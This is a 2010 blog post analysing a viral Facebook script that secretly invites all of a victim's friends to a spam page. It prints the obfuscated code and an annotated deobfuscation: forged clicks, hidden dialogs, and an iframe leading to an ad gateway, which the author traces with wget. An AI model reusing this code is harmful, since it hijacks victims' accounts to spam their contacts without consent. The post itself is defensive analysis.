---
layout: post
title: Understanding hacky, viral Facebook JavaScripts
tags:
 - Facebook
 - JavaScript
 - programming
summary: How to dissassemble and understand a Facebook auto-inviter.
---

First of all, why do I say **viral**? Because it spreads like a virus. It hit
me some time last night, when I got an email from Focebook, claiming that a
dear colleague of mine (not to point fingers here, but it was you, Trubol,
congratulations!) "likes" a page entitled "**The Most CRAZIEST & EPIC Facebook
Break up EVER!**", and he suggests I like it too.

Now I know him well enough to know that he would probably not send me something
like that - after all, we're programmers, [serious
people](http://picasaweb.google.com/attilaolah/Obnob?authkey=Gv1sRgCJyxhImS67PdlAE&feat=directlink),
you know :) Anyway, I figured something fishi's going on. Somebody must have
[threatened him](http://en.wikipedia.org/wiki/AK-47) to do this, or maybe a
[spam bot](http://en.wikipedia.org/wiki/Spambot) took control over his
computer, which is highly unlikely, as he, like a good American, is a
[Mac-freek too](http://twitter.com/TEDNews/status/18441255555) (sorry 'bout my
prejudice, I grew it over time).

Anyway, when I saw the link in the email, like a good paranoid droid, I opened
up a private browsing tab in Chromium, and signed in to Focebook with my
**developer test account** (remember you can create as many Facebook accounts
as you wish, you just need to mark them as "[test
accounts](http://developers.facebook.com/blog/post/35)", as per the [Facebook
TOS](http://www.facebook.com/terms.php)). Then went to the page, which looked
something like this:

<div class="center">
    <img src="/media/images/random/facebook-js-unliked.png" alt="Before I 'like' the page" />
</div>

So I guess I need to "like" this one too. Let's see what happens if I obey:

<div class="center">
    <img src="/media/images/random/facebook-js-liked.png" alt="After I 'like' it" />
</div>

At this point I thought I'd have a closer look at the code before executing it.
It's one big line, so I couldn't inline it here, bit I took the liberty of
[grabbing a copy for myself](/downloads/javascript/evilfb.js).

After adding some newlines and indentation and replacing local variables with
their actual content, it looks something like this:

{% highlight javascript %}
/*
 * The first two arrays are obfuscated names of built-in properties/methods,
 * and some obfustcated, to-be-injected HTML. Although I don't really get why
 * the second array, one seems to be enough...
 */

var _0x8a00 = [
    "\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C",
    "\x61\x70\x70\x34\x39\x34\x39\x37\x35\x32\x38\x37\x38\x5F\x62\x6F\x64\x79",
    "\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64",
    "\x3C\x61\x20\x69\x64\x3D\x22\x73\x75\x67\x67\x65\x73\x74\x22\x20\x68\x72" +
        "\x65\x66\x3D\x22\x23\x22\x20\x61\x6A\x61\x78\x69\x66\x79\x3D\x22\x2F" +
        "\x61\x6A\x61\x78\x2F\x73\x6F\x63\x69\x61\x6C\x5F\x67\x72\x61\x70\x68" +
        "\x2F\x69\x6E\x76\x69\x74\x65\x5F\x64\x69\x61\x6C\x6F\x67\x2E\x70\x68" +
        "\x70\x3F\x63\x6C\x61\x73\x73\x3D\x46\x61\x6E\x4D\x61\x6E\x61\x67\x65" +
        "\x72\x26\x6E\x6F\x64\x65\x5F\x69\x64\x3D\x31\x36\x39\x36\x32\x35\x36" +
        "\x33\x39\x37\x32\x31\x32\x39\x32\x22\x20\x63\x6C\x61\x73\x73\x3D\x22" +
        "\x20\x70\x72\x6F\x66\x69\x6C\x65\x5F\x61\x63\x74\x69\x6F\x6E\x20\x61" +
        "\x63\x74\x69\x6F\x6E\x73\x70\x72\x6F\x5F\x61\x22\x20\x72\x65\x6C\x3D" +
        "\x22\x64\x69\x61\x6C\x6F\x67\x2D\x70\x6F\x73\x74\x22\x3E\x53\x75\x67" +
        "\x67\x65\x73\x74\x20\x74\x6F\x20\x46\x72\x69\x65\x6E\x64\x73\x3C\x2F" +
        "\x61\x3E",
    "\x73\x75\x67\x67\x65\x73\x74",
    "\x4D\x6F\x75\x73\x65\x45\x76\x65\x6E\x74\x73",
    "\x63\x72\x65\x61\x74\x65\x45\x76\x65\x6E\x74",
    "\x63\x6C\x69\x63\x6B",
    "\x69\x6E\x69\x74\x45\x76\x65\x6E\x74",
    "\x64\x69\x73\x70\x61\x74\x63\x68\x45\x76\x65\x6E\x74",
    "\x73\x65\x6C\x65\x63\x74\x5F\x61\x6C\x6C",
    "\x73\x67\x6D\x5F\x69\x6E\x76\x69\x74\x65\x5F\x66\x6F\x72\x6D",
    "\x2F\x61\x6A\x61\x78\x2F\x73\x6F\x63\x69\x61\x6C\x5F\x67\x72\x61\x70\x68" +
        "\x2F\x69\x6E\x76\x69\x74\x65\x5F\x64\x69\x61\x6C\x6F\x67\x2E\x70\x68" +
        "\x70",
    "\x73\x75\x62\x6D\x69\x74\x44\x69\x61\x6C\x6F\x67",
    "\x3C\x61\x20\x72\x65\x6C\x3D\x22\x64\x69\x61\x6C\x6F\x67\x22\x20\x68\x72" +
        "\x65\x66\x3D\x22\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61" +
        "\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x73" +
        "\x68\x61\x72\x65\x5F\x64\x69\x61\x6C\x6F\x67\x2E\x70\x68\x70\x3F\x73" +
        "\x3D\x31\x38\x26\x61\x6D\x70\x3B\x61\x70\x70\x69\x64\x3D\x34\x39\x34" +
        "\x39\x37\x35\x32\x38\x37\x38\x26\x61\x6D\x70\x3B\x70\x5B\x5D\x3D\x31" +
        "\x36\x39\x36\x32\x35\x36\x33\x39\x37\x32\x31\x32\x39\x32\x22\x20\x74" +
        "\x69\x74\x6C\x65\x3D\x22\x53\x65\x6E\x64\x20\x74\x68\x69\x73\x20\x74" +
        "\x6F\x20\x66\x72\x69\x65\x6E\x64\x73\x20\x6F\x72\x20\x70\x6F\x73\x74" +
        "\x20\x69\x74\x20\x6F\x6E\x20\x79\x6F\x75\x72\x20\x70\x72\x6F\x66\x69" +
        "\x6C\x65\x2E\x22\x20\x69\x64\x3D\x22\x73\x6C\x69\x6E\x6B\x22\x20\x63" +
        "\x6C\x61\x73\x73\x3D\x22\x73\x68\x61\x72\x65\x20\x73\x68\x61\x72\x65" +
        "\x5F\x61\x22\x3E\x53\x68\x61\x72\x65\x3C\x2F\x61\x3E",
    "\x69\x6E\x70\x75\x74",
    "\x53\x68\x61\x72\x65",
    "\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61" +
        "\x6D\x65",
    "\x6A\x75\x6E\x6B",
    "\x61\x70\x70\x34\x39\x34\x39\x37\x35\x32\x38\x37\x38\x5F\x73\x68\x64\x69" +
        "\x76",
    "\x61\x70\x70\x34\x39\x34\x39\x37\x35\x32\x38\x37\x38\x5F\x73\x67\x64\x69" +
        "\x76",
    "\x73\x6C\x69\x6E\x6B",
    "\x76\x61\x6C\x75\x65",
    "\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x3A" +
        "\x2F\x2F\x62\x69\x74\x2E\x6C\x79\x2F\x64\x77\x44\x63\x76\x55\x22\x20" +
        "\x66\x72\x61\x6D\x65\x62\x6F\x72\x64\x65\x72\x3D\x22\x30\x22\x20\x77" +
        "\x69\x64\x74\x68\x3D\x22\x35\x32\x30\x22\x20\x68\x65\x69\x67\x68\x74" +
        "\x3D\x22\x38\x30\x30\x22\x20\x73\x63\x72\x6F\x6C\x6C\x69\x6E\x67\x3D" +
        "\x22\x6E\x6F\x22\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E",
    "\x61\x28\x29",
    "\x73\x65\x74\x54\x69\x6D\x65\x6F\x75\x74",
    "\x64\x69\x73\x70\x6C\x61\x79",
    "\x73\x74\x79\x6C\x65",
    "\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65",
    "\x70\x6F\x70\x5F\x63\x6F\x6E\x74\x65\x6E\x74",
    "\x6E\x6F\x6E\x65"
];
var v = [
    _0x8a00[0],
    _0x8a00[1],
    _0x8a00[2],
    _0x8a00[3],
    _0x8a00[4],
    _0x8a00[5],
    _0x8a00[6],
    _0x8a00[7],
    _0x8a00[8],
    _0x8a00[9],
    _0x8a00[10],
    _0x8a00[11],
    _0x8a00[12],
    _0x8a00[13],
    _0x8a00[14],
    _0x8a00[15],
    _0x8a00[16],
    _0x8a00[17],
    _0x8a00[18]
];

/*
 * Note: here's an easier-to-read version of the first one. It looks even more
 * suspicious, if possible.
 */

var _0x8a00 = [
    'innerHTML',
    'app4949752878_body',
    'getElementById',
    '<a id="suggest" ' +
        'href="#" ' +
        'ajaxify="/ajax/social_graph/invite_dialog.php?' +
            'class=FanManager&node_id=169625639721292" ' +
        'class=" profile_action actionspro_a" ' +
        'rel="dialog-post">' +
            'Suggest to Friends' +
    '</a>',
    'suggest',
    'MouseEvents',
    'createEvent',
    'click',
    'initEvent',
    'dispatchEvent',
    'select_all',
    'sgm_invite_form',
    '/ajax/social_graph/invite_dialog.php',
    'submitDialog',
    '<a rel="dialog" ' +
        'href="http://www.facebook.com/ajax/share_dialog.php?' +
            's=18&amp;appid=4949752878&amp;p[]=169625639721292" ' +
        'title="Send this to friends or post it on your profile." ' +
        'id="slink" ' +
        'class="share share_a">' +
            'Share' +
    '</a>',
    'input',
    'Share',
    'getElementsByTagName',
    'junk',
    'app4949752878_shdiv',
    'app4949752878_sgdiv',
    'slink',
    'value',
    '<iframe src="http://bit.ly/dwDcvU" ' +
        'frameborder="0" ' +
        'width="520" ' +
        'height="800" ' +
        'scrolling="no">' +
    '</iframe>',
    'a()',
    'setTimeout',
    'display',
    'style',
    'parentNode',
    'pop_content',
    'none'
];

/*
 * Next we can substitute these values in the rest of the expressions to get a
 * cleaner picture. First we have two simple HTML injections.
 */

//void(d[v[2]](_0x8a00[19])[v[0]]=[v[14]]);
document.getElementById('app4949752878_shdiv').innerHTML =
    '<a rel="dialog" ' +
        'href="http://www.facebook.com/ajax/share_dialog.php?' +
            's=18&amp;appid=4949752878&amp;p[]=169625639721292" ' +
        'title="Send this to friends or post it on your profile." ' +
        'id="slink" ' +
        'class="share share_a">' +
         'Share' +
    '</a>';

//void(d[v[2]](_0x8a00[20])[v[0]]=[v[3]]);sl=d[v[2]](_0x8a00[21]);var ss=d[v[2]](v[4]);var c=d[v[6]](v[5]);
document.getElementById('app4949752878_sgdiv').innerHTML =
    '<a id="suggest" href="#" ' +
        'ajaxify="/ajax/social_graph/invite_dialog.php?class=FanManager&node_id=169625639721292" ' +
        'class="profile_action actionspro_a" rel="dialog-post">' +
            'Suggest to Friends' +
    '</a>';
/* Now a couple of assigments, and also we create a mouse event. */
var sl = document.getElementById('slink');
var ss = document.getElementById('suggest');
var c = document.createEvent('MouseEvents');

//void c[v[8]](v[7],true,true);
c.initEvent('click', true, true);
/* It looks like the wouse event is going to be a 'click' event. */

//void sl[v[9]](c);inp=document[v[17]](v[15]);
sl.dispatchEvent(c);
/* And we've just made our first click. */
var inp = document.getElementsByTagName('input');
/* Wait, there are some inputs on the page... */

//void setTimeout(function (){for(i in inp){if(inp[i][_0x8a00[22]]==v[16])
//{inp[i][v[9]](c);} ;} ;} ,11000);
setTimeout(function () {
    for (i in inp) {
        if (inp[i].parentNode == 'Share') {
            inp[i].dispatchEvent(c);
        }
    }
} ,11000);
/*
 * So, wait 11 seconds, and click on the input that has 'Share' next to it.
 * It seems using '==' instead of the usual '===' is the key here :)
 */

//void setTimeout(function (){ss[v[9]](c);} ,2500);
setTimeout(function () {
    ss.dispatchEvent(c);
} ,2500);
/* After two and a half seconds, we feel the need to click on the 'suggest' button. */

//void setTimeout(function (){document[v[2]](v[1])[v[0]]=_0x8a00[23];} ,3000);
setTimeout(function () {
    document.getElementById('app4949752878_body').innerHTML =
        '<iframe ' +
            'src="http://bit.ly/dwDcvU" ' +
            'frameborder="0" ' +
            'width="520" ' +
            'height="800" ' +
            'scrolling="no">' +
        '</iframe>';
}, 3000);
/* Insert an iframe. I'll get back to this later. */

//void setTimeout(function (){fs[v[10]]();} ,8000);
setTimeout(function () {
    fs.select_all();
}, 8000);
/* Not sure where is the 'fs' object coming from, */
/* but it seems it is selecting our friends. */

//void setTimeout(function (){SocialGraphManager[v[13]](v[11],v[12]);} ,9000);
setTimeout(function () {
    SocialGraphManager.submitDialog(
        '/ajax/social_graph/invite_dialog.php',
        'sgm_invite_form'
    );
}, 9000);
/* Wait, we've just sent out the suggests. But why didn't the user notuce this? */

//function a(){if(1==1){window[_0x8a00[25]](_0x8a00[24],10);d[_0x8a00[2]](_0x8a00[29]
//)[_0x8a00[28]][_0x8a00[28]][_0x8a00[27]][_0x8a00[26]]=_0x8a00[30];} ;} ;a();
function a() {
    if (1==1) {
        window.setTimeout('a()', 10);
        document.getElementById('pop_content').parentNode.parentNode.style.display = 'none';
        /* Ah, this is why. We hide the whole damn dialog, once every 10 milliseconds. */
    }
};
a();
{% endhighlight %}

Note that I've removed a few extra semicolons. If you're the author of the
script in question, you should use [JSLint](http://www.jslint.com/) more often.
Don't put semicolons after expressions that are the bodies of statements like
`if` or `for`.

Now about that `<iframe>` tag. Let's have a closer look:

{% highlight console %}
aatiis@aiur ~ $ wget http://bit.ly/dwDcvU
--2010-10-25 12:21:18--  http://bit.ly/dwDcvU
Resolving bit.ly (bit.ly)... 168.143.172.53, 168.143.174.25, 168.143.174.29, ...
Connecting to bit.ly (bit.ly)|168.143.172.53|:80... connected.
HTTP request sent, awaiting response... 301 Moved
Location: http://www.rofling.co.cc/epic-break-up/index.html [following]
--2010-10-25 12:21:18--  http://www.rofling.co.cc/epic-break-up/index.html
Resolving www.rofling.co.cc (www.rofling.co.cc)... 75.119.197.17
Connecting to www.rofling.co.cc (www.rofling.co.cc)|75.119.197.17|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1823 (1.8K) [text/html]
Saving to: `dwDcvU'

100%[=============================================>] 1,823       --.-K/s   in 0s

2010-10-25 12:21:20 (104 MB/s) - `dwDcvU' saved [1823/1823]
{% endhighlight %}

The downloaded file is pretty simple. A quick search for the redirected domain
[shows nothing
interesting](http://www.google.com/search?q=site:rofling.co.cc&filter=0). The
page contains a `script` tag with
`src="http://www.cpalead.com/mygateway.php?pub=46842&amp;gateid=MTQ3MzUx"`. Of
coulse, it all comes down to advertising. Having a look at the [hosting
website](http://www.cpalead.com/), I didn't find out anythung useful. If you
happen to know hwo's the author of the script, please deliver one question for
me: "**was it really worth it?**" I suppose he can answer, as there's also
Google Analytics on the page.

Another weird thing is, why the copy-paste thing? Wouldn't it be easier to
attach the thing to a `click` event on some link and show a huge "click here"
button? Or is this a trick to bypass the Facebook TOS?

And, last, but not least, is there any content? :)
